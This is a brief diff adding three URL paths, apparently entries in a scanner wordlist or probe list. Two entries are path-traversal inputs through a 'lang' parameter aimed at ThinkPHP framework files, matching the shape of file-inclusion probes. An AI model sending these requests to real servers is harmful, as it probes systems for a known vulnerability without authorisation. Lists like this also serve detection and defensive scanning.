@@ -1,0 +1,3 @@
+/index.php?s=example
+/?lang=../../thinkphp/base
+/?lang=../../../../../vendor/topthink/think-trace/src/TraceDebug
